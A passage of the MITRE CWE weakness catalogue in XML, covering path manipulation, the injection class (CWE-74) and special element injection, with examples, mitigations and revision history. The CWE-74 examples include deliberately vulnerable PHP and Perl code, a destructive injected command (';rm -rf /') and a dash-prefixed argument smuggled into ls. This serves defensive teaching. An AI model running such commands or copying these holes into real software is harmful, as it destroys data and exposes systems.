               <Entry_Name>Path Manipulation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP16</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="267"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="72"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="80"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Notes>
            <Note Type="Maintenance">CWE-114 is a Class, but it is listed a child of CWE-73 in view 1000. This suggests some abstraction problems that should be resolved in future versions.</Note>
            <Note Type="Relationship">
               <xhtml:p>The external control of filenames can be the primary link in chains with other file-related weaknesses, as seen in the CanPrecede relationships. This is because software systems use files for many different purposes: to execute programs, load code libraries, to store application data, to store configuration settings, record temporary data, act as signals or semaphores to other processes, etc.</xhtml:p>
               <xhtml:p>However, those weaknesses do not always require external control. For example, link-following weaknesses (CWE-59) often involve pathnames that are not controllable by the attacker at all.</xhtml:p>
               <xhtml:p>The external control can be resultant from other issues. For example, in PHP applications, the register_globals setting can allow an attacker to modify variables that the programmer thought were immutable, enabling file inclusion (CWE-98) and path traversal (CWE-22). Operating with excessive privileges (CWE-250) might allow an attacker to specify an input filename that is not directly readable by the attacker, but is accessible to the privileged program. A buffer overflow (CWE-119) might give an attacker control over nearby memory locations that are related to pathnames, but were not directly modifiable by the attacker.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Common_Consequences, Demonstrative_Examples, Description, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships, Time_of_Introduction, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Detection_Factors, Potential_Mitigations</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Path Manipulation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="74" Name="Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.</Description>
         <Extended_Description>Software or other automated logic has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features that classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Many injection attacks involve the disclosure of important information -- in terms of both data sensitivity and usefulness in further exploitation.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Alter Execution Logic</Impact>
               <Note>Injection attacks are characterized by the ability to significantly change the flow of a given process, and in some cases, to the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Data injection attacks lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Programming languages and supporting technologies might be chosen which are not subject to these issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Utilize an appropriate mix of allowlist and denylist parsing to filter control-plane syntax from all input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-151">
               <Intro_Text>This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$userName = $_POST["user"];<xhtml:br/>$command = 'ls -l /home/' . $userName;<xhtml:br/>system($command);</xhtml:div>
               </Example_Code>
               <Body_Text>The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Which would result in $command being:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>ls -l /home/;rm -rf /</xhtml:div>
               </Example_Code>
               <Body_Text>Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.</Body_Text>
               <Body_Text>Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-150">
               <Intro_Text>Consider the following program. It intends to perform an "ls -l" on an input filename. The validate_name() subroutine performs validation on the input to make sure that only alphanumeric and "-" characters are allowed, which avoids path traversal (CWE-22) and OS command injection (CWE-78) weaknesses. Only filenames like "abc" or "d-e-f" are intended to be allowed.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>
					my $arg = GetArgument("filename");<xhtml:br/>
					do_listing($arg);<xhtml:br/>
					<xhtml:br/>

					sub do_listing {<xhtml:br/>
					<xhtml:div>
						my($fname) = @_;<xhtml:br/>
						if (! validate_name($fname)) {<xhtml:br/>
							<xhtml:div>
							print "Error: name is not well-formed!\n";<xhtml:br/>
							return;<xhtml:br/>
							</xhtml:div>
						}<xhtml:br/>
						<xhtml:i># build command</xhtml:i><xhtml:br/>
						my $cmd = "/bin/ls -l $fname";<xhtml:br/>
						system($cmd);<xhtml:br/>
					</xhtml:div>
					}
					<xhtml:br/><xhtml:br/>
					sub validate_name {<xhtml:br/>
					<xhtml:div>
						my($name) = @_;<xhtml:br/>
						if ($name =~ /^[\w\-]+$/) {<xhtml:br/>
						<xhtml:div>
							return(1);<xhtml:br/>
						</xhtml:div>
						}<xhtml:br/>
						else {<xhtml:br/>
						<xhtml:div>
							return(0);<xhtml:br/>
						</xhtml:div>
						}<xhtml:br/>
					</xhtml:div>
					}
				  </xhtml:div>
               </Example_Code>

               <Body_Text><xhtml:p>However, validate_name() alows
               filenames that begin with a "-". An adversary could
               supply a filename like "-aR", producing the "ls -l -aR"
               command (CWE-88), thereby getting a full recursive
               listing of the entire directory and all of its
               sub-directories.</xhtml:p>

			   <xhtml:p>There are a couple possible mitigations for this
			   weakness. One would be to refactor the code to avoid
			   using system() altogether, instead relying on internal
			   functions.</xhtml:p>

			   <xhtml:p>Another option could be to add a "--" argument
			   to the ls command, such as "ls -l --", so that any
			   remaining arguments are treated as filenames, causing
			   any leading "-" to be treated as part of a filename
			   instead of another option.</xhtml:p>

			   <xhtml:p>Another fix might be to change the regular expression used in validate_name to force the first character of the filename to be a letter or number, such as:</xhtml:p>
			   </Body_Text>
			   <Example_Code Nature="Good" Language="Perl">
			   	 <xhtml:div>
				   if ($name =~ /^\w[\w\-]+$/) ...
				 </xhtml:div>
			   </Example_Code>
            </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-36069</Reference>
               <Description>Python-based dependency management tool avoids OS command injection  when generating Git commands but allows  injection of optional arguments with input beginning with a dash, potentially allowing for code execution.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-36069</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0067</Reference>
               <Description>Canonical example of OS command injection. CGI program does not neutralize "|" metacharacter when invoking a phonebook program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-0067</Link>
            </Observed_Example>
            <Observed_Example>
              <Reference>CVE-2022-1509</Reference>
              <Description>injection of sed script syntax ("sed injection")</Description>
              <Link>https://www.cve.org/CVERecord?id=CVE-2022-1509</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2021-44228</Reference>
	      <Description>Product does not neutralize ${xyz} style expressions, allowing remote code execution. (log4shell vulnerability)</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2021-44228</Link>
	    </Observed_Example>
          </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Injection problem ('data' used as something else)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="101"/>
            <Related_Attack_Pattern CAPEC_ID="105"/>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="120"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="135"/>
            <Related_Attack_Pattern CAPEC_ID="14"/>
            <Related_Attack_Pattern CAPEC_ID="24"/>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="267"/>
            <Related_Attack_Pattern CAPEC_ID="273"/>
            <Related_Attack_Pattern CAPEC_ID="28"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="34"/>
            <Related_Attack_Pattern CAPEC_ID="42"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="46"/>
            <Related_Attack_Pattern CAPEC_ID="47"/>
            <Related_Attack_Pattern CAPEC_ID="51"/>
            <Related_Attack_Pattern CAPEC_ID="52"/>
            <Related_Attack_Pattern CAPEC_ID="53"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="67"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
            <Related_Attack_Pattern CAPEC_ID="71"/>
            <Related_Attack_Pattern CAPEC_ID="72"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="8"/>
            <Related_Attack_Pattern CAPEC_ID="80"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
            <Related_Attack_Pattern CAPEC_ID="84"/>
            <Related_Attack_Pattern CAPEC_ID="9"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Notes>
            <Note Type="Theoretical">Many people treat injection only as an input validation problem (CWE-20) because many people do not distinguish between the consequence/attack (injection) and the protection mechanism that prevents the attack from succeeding. However, input validation is only one potential protection mechanism (output encoding is another), and there is a chaining relationship between improper input validation and the improper enforcement of the structure of messages to other components. Other issues not directly related to input validation, such as race conditions, could similarly impact message structure.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationship_Notes, Relationships, Theoretical_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize Data into a Different Plane (aka 'Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Sanitize Data into a Different Plane ('Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="75" Name="Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not adequately filter user-controlled input for special elements with control implications.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Programming languages and supporting technologies might be chosen which are not subject to these issues.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Utilize an appropriate mix of allowlist and denylist parsing to filter special element syntax from all input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Special Element Injection</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="93"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
